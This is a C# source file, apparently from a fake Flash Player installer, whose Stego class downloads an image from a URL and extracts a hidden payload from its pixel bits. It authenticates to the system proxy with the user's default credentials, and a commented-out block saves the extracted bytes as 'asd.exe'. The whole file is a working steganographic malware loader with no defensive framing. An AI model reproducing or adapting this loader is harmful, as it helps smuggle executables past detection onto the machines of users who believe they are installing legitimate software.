using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Collections;
using System.IO;
using System.Diagnostics;
using System.Net;

namespace flashplayerpp_install_cn
{
    public class Stego
    {
        public String imgUrl;
        public Stego(string url)
        {
            this.imgUrl = url;
        }
        public byte extract(Color pixel)
        {
            byte[] RedBits = getBits((byte)pixel.R);
            byte[] GreenBits = getBits((byte)pixel.G);
            byte[] BlueBits = getBits((byte)pixel.B);
            byte[] BitsToDecrypt = new byte[8];

            BitsToDecrypt[0] = RedBits[5];
            BitsToDecrypt[1] = GreenBits[5];
            BitsToDecrypt[2] = RedBits[6];
            BitsToDecrypt[3] = RedBits[7];
            BitsToDecrypt[4] = GreenBits[6];
            BitsToDecrypt[5] = GreenBits[7];
            BitsToDecrypt[6] = BlueBits[6];
            BitsToDecrypt[7] = BlueBits[7];

            return getByte(BitsToDecrypt);
        }

        private byte getByte(byte[] bits)
        {
            String bitString = "";
            for (int i = 0; i < 8; i++)
                bitString += bits[i];
            byte newpix = Convert.ToByte(bitString, 2);
            int dePix = (int)newpix;
            return (byte)dePix;
        }

        private byte[] getBits(byte simplepixel)
        {
            int pixel = 0;
            pixel = (int)simplepixel;
            BitArray bits = new BitArray(new byte[] { (byte)pixel });
            bool[] boolarray = new bool[bits.Count];
            bits.CopyTo(boolarray, 0);
            byte[] bitsArray = boolarray.Select(bit => (byte)(bit ? 1 : 0)).ToArray();
            Array.Reverse(bitsArray);
            return bitsArray;
        }

        public byte[] Run()
        {
            /*
            var webC = new System.Net.WebClient();
            //var credentialsCache = new CredentialCache { { imgUrl, "NTLM", CredentialCache.DefaultNetworkCredentials } };
            webC.Credentials = CredentialCache.DefaultNetworkCredentials;

            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Ssl3;
            System.Net.ServicePointManager.DefaultConnectionLimit = 50;
            */

            WebRequest request = WebRequest.Create(imgUrl);
            request.Proxy = WebRequest.GetSystemWebProxy();
            request.Proxy.Credentials = CredentialCache.DefaultCredentials;
            WebResponse response = request.GetResponse();
            Stream receiveStream = response.GetResponseStream();

            var EncryptedImage = new Bitmap(receiveStream);

            string flength = "";

            for (int j = 3; j < 16; j++)
            {
                Color pixelToDecode = EncryptedImage.GetPixel(EncryptedImage.Width - j - 1, EncryptedImage.Height - 1);
                byte delength = extract(pixelToDecode);
                flength += Convert.ToInt32(Encoding.ASCII.GetString(BitConverter.GetBytes(delength)));
            }
            int length = Convert.ToInt32(flength);

            string dlength = "";

            for (int j = 16; j < 20; j++)
            {
                Color pixelToDecode = EncryptedImage.GetPixel(EncryptedImage.Width - j - 1, EncryptedImage.Height - 1);
                byte delength = extract(pixelToDecode);
                dlength += Convert.ToInt32(Encoding.ASCII.GetString(BitConverter.GetBytes(delength)));
            }

            int name_length = Convert.ToInt32(dlength);
            int k = 0;

            byte[] data = new byte[length];

            for (int i = 0; i < EncryptedImage.Height; i++)
            {

                for (int j = 0; j < EncryptedImage.Width; j++)
                {
                    if (k < length)
                    {
                        Color pixelToDecode = EncryptedImage.GetPixel(j, i);
                        byte demsg = extract(pixelToDecode);
                        data[k] = demsg;
                        k++;
                    }
                }
            }

            //save the file
            /*
            FileStream write = new FileStream("asd.exe", FileMode.Create);
            BinaryWriter writeBinary = new BinaryWriter(write);
            writeBinary.Write(data);
            writeBinary.Close();
            */

            return data;
        }
    }
}
